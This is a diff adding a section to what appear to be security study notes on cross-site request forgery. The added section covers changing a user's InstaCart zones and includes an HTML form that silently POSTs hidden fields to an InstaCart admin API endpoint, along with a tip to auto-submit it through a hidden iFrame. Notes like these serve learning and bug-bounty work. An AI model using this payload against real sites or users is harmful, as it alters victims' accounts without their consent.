@@ -152,3 +152,17 @@ hello
     ```
     - To find this vulnerability
         - Use proxy server like Burp or OWASP's ZAP to monitor HTTP request
+
+
+- **Change Users InstaCart Zones**
+    - For greater attack surface, consider website API endpoint as well as it's web page
+    ``` 
+    <body>
+        <form method="POST" action="https://admin.instacart.com/api/v2/zones">
+            <input type="hidden" name="Zip" value="10001"/>
+            <input type="hidden" name="override" value="true"/>
+            <input type="submit" value="Submit"/>
+        </form>
+    </body>
+    ```
+    - Here we can add hidden iFrame to autosubmit request
